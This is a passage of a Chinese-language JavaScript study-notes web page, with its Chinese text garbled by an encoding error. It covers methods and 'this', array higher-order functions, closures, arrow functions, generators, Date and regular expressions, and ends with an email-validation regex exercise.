title="æ–¹æ³•"></a>æ–¹æ³•</h2><p>åœ¨ä¸€ä¸ªå¯¹è±¡ä¸­ç»‘å®šå‡½æ•°ï¼Œç§°ä¸ºè¿™ä¸ªå¯¹è±¡çš„æ–¹æ³•ã€‚</p><p>åœ¨ä¸€ä¸ªæ–¹æ³•å†…éƒ¨ï¼Œ<code>this</code>æ˜¯ä¸€ä¸ªç‰¹æ®Šå˜é‡ï¼Œå®ƒå§‹ç»ˆæŒ‡å‘å½“å‰å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯<code>xiaoming</code>è¿™ä¸ªå˜é‡ã€‚æ‰€ä»¥ï¼Œ<code>this.birth</code>å¯ä»¥æ‹¿åˆ°<code>xiaoming</code>çš„<code>birth</code>å±æ€§ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAge</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> y = <span class="keyword">new</span> <span class="built_in">Date</span>().getFullYear();</span><br><span class="line">    <span class="keyword">return</span> y - <span class="keyword">this</span>.birth;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> xiaoming = &#123;</span><br><span class="line">    name: <span class="string">'å°æ˜'</span>,</span><br><span class="line">    birth: <span class="number">1990</span>,</span><br><span class="line">    age: getAge</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xiaoming.age(); <span class="comment">// 30, æ­£å¸¸ç»“æœ</span></span><br><span class="line">getAge(); <span class="comment">// NaN</span></span><br></pre></td></tr></table></figure><p>å¦‚æœä»¥å¯¹è±¡çš„æ–¹æ³•å½¢å¼è°ƒç”¨ï¼Œæ¯”å¦‚<code>xiaoming.age()</code>ï¼Œè¯¥å‡½æ•°çš„<code>this</code>æŒ‡å‘è¢«è°ƒç”¨çš„å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯<code>xiaoming</code>ï¼Œè¿™æ˜¯ç¬¦åˆæˆ‘ä»¬é¢„æœŸçš„ã€‚</p><p>å¦‚æœå•ç‹¬è°ƒç”¨å‡½æ•°ï¼Œæ¯”å¦‚<code>getAge()</code>ï¼Œæ­¤æ—¶ï¼Œè¯¥å‡½æ•°çš„<code>this</code>æŒ‡å‘å…¨å±€å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯<code>window</code>ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">â€˜use strictâ€™;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> xiaoming = &#123;</span><br><span class="line">name : <span class="string">'xiaoming'</span>,</span><br><span class="line">age : <span class="number">18</span>,</span><br><span class="line">math : <span class="number">90</span>,</span><br><span class="line">en : <span class="number">99</span>,</span><br><span class="line">grades : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> that = <span class="keyword">this</span>;  <span class="comment">//æ•æ‰thisæŒ‡é’ˆ</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getGrades</span>(<span class="params"></span>)</span>&#123;  <span class="comment">//è¿›è¡Œé‡æ„</span></span><br><span class="line"><span class="keyword">return</span> that.math+that.en;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> getGrades();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="é«˜é˜¶å‡½æ•°"><a href="#é«˜é˜¶å‡½æ•°" class="headerlink" title="é«˜é˜¶å‡½æ•°"></a>é«˜é˜¶å‡½æ•°</h2><h3 id="map"><a href="#map" class="headerlink" title="map"></a>map</h3><p>ç”±äº<code>map()</code>æ–¹æ³•å®šä¹‰åœ¨JavaScriptçš„<code>Array</code>ä¸­ï¼Œæˆ‘ä»¬è°ƒç”¨<code>Array</code>çš„<code>map()</code>æ–¹æ³•ï¼Œä¼ å…¥æˆ‘ä»¬è‡ªå·±çš„å‡½æ•°ï¼Œå°±å¾—åˆ°äº†ä¸€ä¸ªæ–°çš„<code>Array</code>ä½œä¸ºç»“æœã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">arr.map(<span class="function"><span class="params">x</span>=&gt;</span>x*<span class="number">2</span>); <span class="comment">//[2,4,6]</span></span><br><span class="line">arr.map(<span class="function"><span class="keyword">function</span>(<span class="params">x</span>)</span>&#123;<span class="keyword">return</span> x*<span class="number">2</span>;&#125;); <span class="comment">//[2,4,6]</span></span><br></pre></td></tr></table></figure><h3 id="reduce"><a href="#reduce" class="headerlink" title="reduce"></a>reduce</h3><p>rrayçš„<code>reduce()</code>æŠŠä¸€ä¸ªå‡½æ•°ä½œç”¨åœ¨è¿™ä¸ª<code>Array</code>çš„<code>[x1, x2, x3...]</code>ä¸Šï¼Œè¿™ä¸ªå‡½æ•°å¿…é¡»æ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼Œ<code>reduce()</code>æŠŠç»“æœç»§ç»­å’Œåºåˆ—çš„ä¸‹ä¸€ä¸ªå…ƒç´ åšç´¯ç§¯è®¡ç®—ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [x1,x2,x3,x4];</span><br><span class="line">arr.reduce(<span class="function">(<span class="params">x,y</span>)=&gt;</span>(x+y)); <span class="comment">//x1+x2+x3+x4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>];</span><br><span class="line">arr.reduce(<span class="function"><span class="keyword">function</span> (<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x * <span class="number">10</span> + y;</span><br><span class="line">&#125;); <span class="comment">// 13579</span></span><br></pre></td></tr></table></figure><h3 id="filter"><a href="#filter" class="headerlink" title="filter"></a><strong>filter</strong></h3><p>filterä¹Ÿæ˜¯ä¸€ä¸ªå¸¸ç”¨çš„æ“ä½œï¼Œå®ƒç”¨äºæŠŠ<code>Array</code>çš„æŸäº›å…ƒç´ è¿‡æ»¤æ‰ï¼Œç„¶åè¿”å›å‰©ä¸‹çš„å…ƒç´ ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>];</span><br><span class="line"><span class="keyword">var</span> r = arr.filter(<span class="function"><span class="keyword">function</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> x%<span class="number">2</span> !=<span class="number">0</span>;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">console</span>.log(r);</span><br></pre></td></tr></table></figure><h3 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h3><p>jsä¸­æ’åºç®—æ³•æ˜¯å…ˆæŠŠæ‰€æœ‰å…ƒç´ å…ˆè½¬æ¢ä¸ºStringå†æŒ‰ç…§asciiç æ’åºã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var arr &#x3D; [10,20,1,2];</span><br><span class="line">var r &#x3D; arr.sort(function(x,y)&#123;</span><br><span class="line">if(x&lt;y)return 1;</span><br><span class="line">else if(x&gt;y)return -1;</span><br><span class="line">return 0;</span><br><span class="line">&#125;)</span><br><span class="line">console.log(arr) &#x2F;&#x2F;[20,10,2,1]</span><br><span class="line">console.log(r)  &#x2F;&#x2F;[20,10,2,1]</span><br></pre></td></tr></table></figure><p><code>sort()</code>æ–¹æ³•ä¼šç›´æ¥å¯¹<code>Array</code>è¿›è¡Œä¿®æ”¹ï¼Œå®ƒè¿”å›çš„ç»“æœä»æ˜¯å½“å‰<code>Array</code>ã€‚</p><h2 id="é—­åŒ…"><a href="#é—­åŒ…" class="headerlink" title="é—­åŒ…"></a>é—­åŒ…</h2><p><strong>å‡½æ•°ä½œä¸ºè¿”å›å€¼</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lazy_sum</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> sum = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> arr.reduce(<span class="function"><span class="keyword">function</span> (<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> x + y;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> f = lazy_sum([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]);</span><br><span class="line">f;   <span class="comment">//fæ˜¯è¿”å›sumå‡½æ•°æœ¬èº«</span></span><br><span class="line">f();  <span class="comment">//f()æ‰æ˜¯è°ƒç”¨å‡½æ•°</span></span><br></pre></td></tr></table></figure><h2 id="ç®­å¤´å‡½æ•°"><a href="#ç®­å¤´å‡½æ•°" class="headerlink" title="ç®­å¤´å‡½æ•°"></a>ç®­å¤´å‡½æ•°</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æ— &#123;&#125;çš„</span></span><br><span class="line">x =&gt; x*x</span><br><span class="line"><span class="function"><span class="keyword">function</span> (<span class="params">x</span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> x*x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//è¿”å›å¤šæ¡</span></span><br><span class="line">x =&gt; &#123;</span><br><span class="line">... return ;</span><br><span class="line">... return ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//å¤šä¸ªå‚æ•°</span></span><br><span class="line">(x,y) =&gt; x*x+y*y</span><br><span class="line"><span class="comment">//è¿”å›å¯¹è±¡</span></span><br><span class="line">x =&gt; (&#123;<span class="attr">foo</span>:x&#125;);</span><br></pre></td></tr></table></figure><h2 id="generator"><a href="#generator" class="headerlink" title="generator"></a>generator</h2><p>generatorç”±<code>function*</code>å®šä¹‰ï¼ˆæ³¨æ„å¤šå‡ºçš„<code>*</code>å·ï¼‰ï¼Œå¹¶ä¸”ï¼Œé™¤äº†<code>return</code>è¯­å¥ï¼Œè¿˜å¯ä»¥ç”¨<code>yield</code>è¿”å›å¤šæ¬¡ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function* foo(x)&#123;</span><br><span class="line">  yield x+1;</span><br><span class="line">  yield x+2;</span><br><span class="line">  return x+3;</span><br><span class="line">&#125;</span><br><span class="line">foo(2);</span><br></pre></td></tr></table></figure><p>è°ƒç”¨generatorå¯¹è±¡æœ‰ä¸¤ä¸ªæ–¹æ³•ï¼Œ</p><ul><li><p>ä¸€æ˜¯ä¸æ–­åœ°è°ƒç”¨generatorå¯¹è±¡çš„<code>next()</code>æ–¹æ³•<code>next()</code>æ–¹æ³•ä¼šæ‰§è¡Œgeneratorçš„ä»£ç ï¼Œç„¶åï¼Œæ¯æ¬¡é‡åˆ°<code>yield x;</code>å°±è¿”å›ä¸€ä¸ªå¯¹è±¡<code>{value: x, done: true/false}</code>ï¼Œç„¶åâ€œæš‚åœâ€ã€‚è¿”å›çš„<code>value</code>å°±æ˜¯<code>yield</code>çš„è¿”å›å€¼ï¼Œ<code>done</code>è¡¨ç¤ºè¿™ä¸ªgeneratoræ˜¯å¦å·²ç»æ‰§è¡Œç»“æŸäº†ã€‚å¦‚æœ<code>done</code>ä¸º<code>true</code>ï¼Œåˆ™<code>value</code>å°±æ˜¯<code>return</code>çš„è¿”å›å€¼ã€‚</p></li><li><p>ç¬¬äºŒä¸ªæ–¹æ³•æ˜¯ç›´æ¥ç”¨<code>for ... of</code>å¾ªç¯è¿­ä»£generatorå¯¹è±¡ï¼Œè¿™ç§æ–¹å¼ä¸éœ€è¦æˆ‘ä»¬è‡ªå·±åˆ¤æ–­<code>done</code>ã€‚</p></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ç¬¬ä¸€ç§</span></span><br><span class="line"><span class="keyword">var</span> f = foo(<span class="number">2</span>);</span><br><span class="line">f.next()<span class="comment">//&#123;value: 3, done: false&#125;</span></span><br><span class="line">f.next()<span class="comment">//&#123;value: 4, done: false&#125;</span></span><br><span class="line">f.next()<span class="comment">//&#123;value: 5, done: true&#125;</span></span><br><span class="line">f.next()<span class="comment">//&#123;value: undefined, done: true&#125;</span></span><br><span class="line"><span class="comment">//ç¬¬äºŒç§</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> x <span class="keyword">of</span> foo(<span class="number">2</span>))&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;  <span class="comment">//3,4</span></span><br></pre></td></tr></table></figure><h1 id="æ ‡å‡†å¯¹è±¡"><a href="#æ ‡å‡†å¯¹è±¡" class="headerlink" title="æ ‡å‡†å¯¹è±¡"></a>æ ‡å‡†å¯¹è±¡</h1><ul><li>ä¸è¦ä½¿ç”¨<code>new Number()</code>ã€<code>new Boolean()</code>ã€<code>new String()</code>åˆ›å»ºåŒ…è£…å¯¹è±¡ï¼›</li><li>ç”¨<code>parseInt()</code>æˆ–<code>parseFloat()</code>æ¥è½¬æ¢ä»»æ„ç±»å‹åˆ°<code>number</code>ï¼›</li><li>ç”¨<code>String()</code>æ¥è½¬æ¢ä»»æ„ç±»å‹åˆ°<code>string</code>ï¼Œæˆ–è€…ç›´æ¥è°ƒç”¨æŸä¸ªå¯¹è±¡çš„<code>toString()</code>æ–¹æ³•ï¼›</li><li>é€šå¸¸ä¸å¿…æŠŠä»»æ„ç±»å‹è½¬æ¢ä¸º<code>boolean</code>å†åˆ¤æ–­ï¼Œå› ä¸ºå¯ä»¥ç›´æ¥å†™<code>if (myVar) {...}</code>ï¼›</li><li><code>typeof</code>æ“ä½œç¬¦å¯ä»¥åˆ¤æ–­å‡º<code>number</code>ã€<code>boolean</code>ã€<code>string</code>ã€<code>function</code>å’Œ<code>undefined</code>ï¼›</li><li>åˆ¤æ–­<code>Array</code>è¦ä½¿ç”¨<code>Array.isArray(arr)</code>ï¼›</li><li>åˆ¤æ–­<code>null</code>è¯·ä½¿ç”¨<code>myVar === null</code>ï¼›</li><li>åˆ¤æ–­æŸä¸ªå…¨å±€å˜é‡æ˜¯å¦å­˜åœ¨ç”¨<code>typeof window.myVar === &#39;undefined&#39;</code>ï¼›</li><li>å‡½æ•°å†…éƒ¨åˆ¤æ–­æŸä¸ªå˜é‡æ˜¯å¦å­˜åœ¨ç”¨<code>typeof myVar === &#39;undefined&#39;</code>ã€‚</li></ul><h2 id="Date"><a href="#Date" class="headerlink" title="Date"></a>Date</h2><p>åœ¨JavaScriptä¸­ï¼Œ<code>Date</code>å¯¹è±¡ç”¨æ¥è¡¨ç¤ºæ—¥æœŸå’Œæ—¶é—´ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var now &#x3D; new Date();</span><br><span class="line">now.getMilliseconds();  &#x2F;&#x2F;æ¯«ç§’æ•°</span><br><span class="line">now.getTime();  &#x2F;&#x2F;æ—¶é—´æˆ³</span><br><span class="line">var d &#x3D; new Date(2020,6,30,8,39,30,123)  &#x2F;&#x2F;è‡ªå®šä¹‰æ—¶é—´</span><br></pre></td></tr></table></figure><h2 id="RegExp"><a href="#RegExp" class="headerlink" title="RegExp"></a>RegExp</h2><h3 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a><strong>åŸºç¡€</strong></h3><p><code>\d</code>å¯ä»¥åŒ¹é…ä¸€ä¸ªæ•°å­—</p><p><code>\w</code>å¯ä»¥åŒ¹é…ä¸€ä¸ªå­—æ¯æˆ–æ•°å­—</p><p><code>.</code>å¯ä»¥åŒ¹é…ä»»æ„å­—ç¬¦</p><p><code>*</code>è¡¨ç¤ºä»»æ„ä¸ªå­—ç¬¦</p><p><code>+</code>è¡¨ç¤ºè‡³å°‘ä¸€ä¸ªå­—ç¬¦</p><p><code>?</code>è¡¨ç¤º0ä¸ªæˆ–1ä¸ªå­—ç¬¦</p><p><code>{n}</code>è¡¨ç¤ºnä¸ªå­—ç¬¦</p><p><code>{n,m}</code>è¡¨ç¤ºn-mä¸ªå­—ç¬¦</p><h3 id="è¿›é˜¶"><a href="#è¿›é˜¶" class="headerlink" title="è¿›é˜¶"></a><strong>è¿›é˜¶</strong></h3><p>è¦åšæ›´ç²¾ç¡®åœ°åŒ¹é…ï¼Œå¯ä»¥ç”¨<code>[]</code>è¡¨ç¤ºèŒƒå›´</p><ul><li><code>[0-9a-zA-Z\_]</code>å¯ä»¥åŒ¹é…ä¸€ä¸ªæ•°å­—ã€å­—æ¯æˆ–è€…ä¸‹åˆ’çº¿ï¼›</li><li><code>[0-9a-zA-Z\_]+</code>å¯ä»¥åŒ¹é…è‡³å°‘ç”±ä¸€ä¸ªæ•°å­—ã€å­—æ¯æˆ–è€…ä¸‹åˆ’çº¿ç»„æˆçš„å­—ç¬¦ä¸²ï¼Œæ¯”å¦‚<code>&#39;a100&#39;</code>ï¼Œ<code>&#39;0_Z&#39;</code>ï¼Œ<code>&#39;js2015&#39;</code>ç­‰ç­‰ï¼›</li><li><code>[a-zA-Z\_\$][0-9a-zA-Z\_\$]*</code>å¯ä»¥åŒ¹é…ç”±å­—æ¯æˆ–ä¸‹åˆ’çº¿ då·å¼€å¤´ï¼Œåæ¥ä»»æ„ä¸ªç”±ä¸€ä¸ªæ•°å­—ã€å­—æ¯æˆ–è€…ä¸‹åˆ’çº¿ då·ç»„æˆçš„å­—ç¬¦ä¸²ï¼Œä¹Ÿå°±æ˜¯JavaScriptå…è®¸çš„å˜é‡åï¼›</li><li><code>[a-zA-Z\_\$][0-9a-zA-Z\_\$]{0, 19}</code>æ›´ç²¾ç¡®åœ°é™åˆ¶äº†å˜é‡çš„é•¿åº¦æ˜¯1-20ä¸ªå­—ç¬¦ï¼ˆå‰é¢1ä¸ªå­—ç¬¦+åé¢æœ€å¤š19ä¸ªå­—ç¬¦ï¼‰ã€‚</li></ul><p><code>A|B</code>å¯ä»¥åŒ¹é…Aæˆ–B</p><p><code>^</code>è¡¨ç¤ºè¡Œçš„å¼€å¤´ï¼Œ<code>^\d</code>è¡¨ç¤ºå¿…é¡»ä»¥æ•°å­—å¼€å¤´ã€‚</p><p><code>$</code>è¡¨ç¤ºè¡Œçš„ç»“æŸï¼Œ<code>\d$</code>è¡¨ç¤ºå¿…é¡»ä»¥æ•°å­—ç»“æŸã€‚</p><h3 id="jsæ­£åˆ™"><a href="#jsæ­£åˆ™" class="headerlink" title="jsæ­£åˆ™"></a><strong>jsæ­£åˆ™</strong></h3><p>JavaScriptæœ‰ä¸¤ç§æ–¹å¼åˆ›å»ºä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼š</p><p>ç¬¬ä¸€ç§æ–¹å¼æ˜¯ç›´æ¥é€šè¿‡<code>/æ­£åˆ™è¡¨è¾¾å¼/</code>å†™å‡ºæ¥ï¼Œç¬¬äºŒç§æ–¹å¼æ˜¯é€šè¿‡<code>new RegExp(&#39;æ­£åˆ™è¡¨è¾¾å¼&#39;)</code>åˆ›å»ºä¸€ä¸ªRegExpå¯¹è±¡ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;ç¬¬ä¸€ç§</span><br><span class="line">var re1 &#x3D; &#x2F;ABC&#x2F;;</span><br><span class="line">&#x2F;&#x2F;ç¬¬äºŒç§</span><br><span class="line">var re2 &#x3D; new RegExp(&#39;ABC&#39;);</span><br></pre></td></tr></table></figure><p>RegExpå¯¹è±¡çš„<code>test()</code>æ–¹æ³•ç”¨äºæµ‹è¯•ç»™å®šçš„å­—ç¬¦ä¸²æ˜¯å¦ç¬¦åˆæ¡ä»¶ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">re2.test(&#39;ABC&#39;);  &#x2F;&#x2F;true</span><br><span class="line">re2.test(&#39;abc&#39;);  &#x2F;&#x2F; false</span><br></pre></td></tr></table></figure><p><strong>åˆ‡åˆ†å­—ç¬¦ä¸²</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'a b   c'</span>.split(<span class="string">' '</span>); <span class="comment">// ['a', 'b', '', '', 'c']</span></span><br><span class="line"><span class="string">'a b   c'</span>.split(<span class="regexp">/\s+/</span>); <span class="comment">// ['a', 'b', 'c']</span></span><br><span class="line"><span class="string">'a,b, c  d'</span>.split(<span class="regexp">/[\s\,]+/</span>); <span class="comment">// ['a', 'b', 'c', 'd']</span></span><br><span class="line"><span class="string">'a,b;; c  d'</span>.split(<span class="regexp">/[\s\,\;]+/</span>); <span class="comment">// ['a', 'b', 'c', 'd']</span></span><br></pre></td></tr></table></figure><p><strong>åˆ†ç»„</strong></p><p>ç”¨<code>()</code>è¡¨ç¤ºçš„å°±æ˜¯è¦æå–çš„åˆ†ç»„ï¼ˆGroupï¼‰</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> re = <span class="regexp">/^(\d&#123;3&#125;)-(\d&#123;3,8&#125;)$/</span>;</span><br><span class="line">re.exec(<span class="string">'010-12345'</span>); <span class="comment">// ['010-12345', '010', '12345']</span></span><br><span class="line">re.exec(<span class="string">'010 12345'</span>); <span class="comment">// null</span></span><br></pre></td></tr></table></figure><p>å¦‚æœæ­£åˆ™è¡¨è¾¾å¼ä¸­å®šä¹‰äº†ç»„ï¼Œå°±å¯ä»¥åœ¨<code>RegExp</code>å¯¹è±¡ä¸Šç”¨<code>exec()</code>æ–¹æ³•æå–å‡ºå­ä¸²æ¥ã€‚</p><p><code>exec()</code>æ–¹æ³•åœ¨åŒ¹é…æˆåŠŸåï¼Œä¼šè¿”å›ä¸€ä¸ª<code>Array</code>ï¼Œç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…åˆ°çš„æ•´ä¸ªå­—ç¬¦ä¸²ï¼Œåé¢çš„å­—ç¬¦ä¸²è¡¨ç¤ºåŒ¹é…æˆåŠŸçš„å­ä¸²ã€‚</p><p><code>exec()</code>æ–¹æ³•åœ¨åŒ¹é…å¤±è´¥æ—¶è¿”å›<code>null</code>ã€‚</p><h3 id="è´ªå©ªåŒ¹é…"><a href="#è´ªå©ªåŒ¹é…" class="headerlink" title="*è´ªå©ªåŒ¹é…"></a><strong>*è´ªå©ªåŒ¹é…</strong></h3><p>éœ€è¦ç‰¹åˆ«æŒ‡å‡ºçš„æ˜¯ï¼Œæ­£åˆ™åŒ¹é…é»˜è®¤æ˜¯è´ªå©ªåŒ¹é…ï¼Œä¹Ÿå°±æ˜¯åŒ¹é…å°½å¯èƒ½å¤šçš„å­—ç¬¦ã€‚ä¸¾ä¾‹å¦‚ä¸‹ï¼ŒåŒ¹é…å‡ºæ•°å­—åé¢çš„<code>0</code>ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var re &#x3D; &#x2F;^(\d+)(0*)$&#x2F;;</span><br><span class="line">re.exec(&#39;102300&#39;); &#x2F;&#x2F; [&#39;102300&#39;, &#39;102300&#39;, &#39;&#39;]</span><br></pre></td></tr></table></figure><p>ç”±äº<code>\d+</code>é‡‡ç”¨è´ªå©ªåŒ¹é…ï¼Œç›´æ¥æŠŠåé¢çš„<code>0</code>å…¨éƒ¨åŒ¹é…äº†ï¼Œç»“æœ<code>0*</code>åªèƒ½åŒ¹é…ç©ºå­—ç¬¦ä¸²äº†ã€‚</p><p>å¿…é¡»è®©<code>\d+</code>é‡‡ç”¨éè´ªå©ªåŒ¹é…ï¼ˆä¹Ÿå°±æ˜¯å°½å¯èƒ½å°‘åŒ¹é…ï¼‰ï¼Œæ‰èƒ½æŠŠåé¢çš„<code>0</code>åŒ¹é…å‡ºæ¥ï¼ŒåŠ ä¸ª<code>?</code>å°±å¯ä»¥è®©<code>\d+</code>é‡‡ç”¨éè´ªå©ªåŒ¹é…ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var re &#x3D; &#x2F;^(\d+?)(0*)$&#x2F;;</span><br><span class="line">re.exec(&#39;102300&#39;); &#x2F;&#x2F; [&#39;102300&#39;, &#39;1023&#39;, &#39;00&#39;]</span><br></pre></td></tr></table></figure><p><strong>å…¨å±€æœç´¢</strong></p><p>JavaScriptçš„æ­£åˆ™è¡¨è¾¾å¼è¿˜æœ‰å‡ ä¸ªç‰¹æ®Šçš„æ ‡å¿—ï¼Œæœ€å¸¸ç”¨çš„æ˜¯<code>g</code>ï¼Œè¡¨ç¤ºå…¨å±€åŒ¹é…ã€‚æ­£åˆ™è¡¨è¾¾å¼è¿˜å¯ä»¥æŒ‡å®š<code>i</code>æ ‡å¿—ï¼Œè¡¨ç¤ºå¿½ç•¥å¤§å°å†™ï¼Œ<code>m</code>æ ‡å¿—ï¼Œè¡¨ç¤ºæ‰§è¡Œå¤šè¡ŒåŒ¹é…ã€‚</p><p><strong>ä½œä¸š</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è¯·å°è¯•å†™ä¸€ä¸ªéªŒè¯Emailåœ°å€çš„æ­£åˆ™è¡¨è¾¾å¼ã€‚</span></span><br><span class="line"><span class="keyword">var</span> re = <span class="regexp">/^[0-9a-zA-Z\.]+\@[0-9a-zA-Z]+\.(com|org)$/</span>;</span><br><span class="line">hould_pass = [<span class="string">'someone@gmail.com'</span>, <span class="string">'bill.gates@microsoft.com'</span>, <span class="string">'tom@voyager.org'</span>, <span class="string">'bob2015@163.com'</span>],</span><br><span class="line">    should_fail = [<span class="string">'test#gmail.com'</span>, <span class="string">'bill@microsoft'</span>, <span class="string">'bill%gates@ms.com'</span>, <span class="string">'@voyager.org'</span>];</span><br><span class="line"><span class="comment">//éªŒè¯å¹¶æå–å‡ºå¸¦åå­—çš„Emailåœ°å€</span></span><br><span class="line"><span class="keyword">var</span> re = <span class="regexp">/^\&lt;(\w+\s+\w+)\&gt; (\w+\.*\@\w+\.+\w+)$/</span>;</span><br><span class="line">shoule_pass = <span class="string">'&lt;Tom Paris&gt; tom@voyager.org'</span>;</span><br></pre></td></tr></table></figure><ul><li>å†™æ­£åˆ™é¦–å…ˆè¦æ³¨æ„è½¬ä¹‰å¦‚ï¼š\s 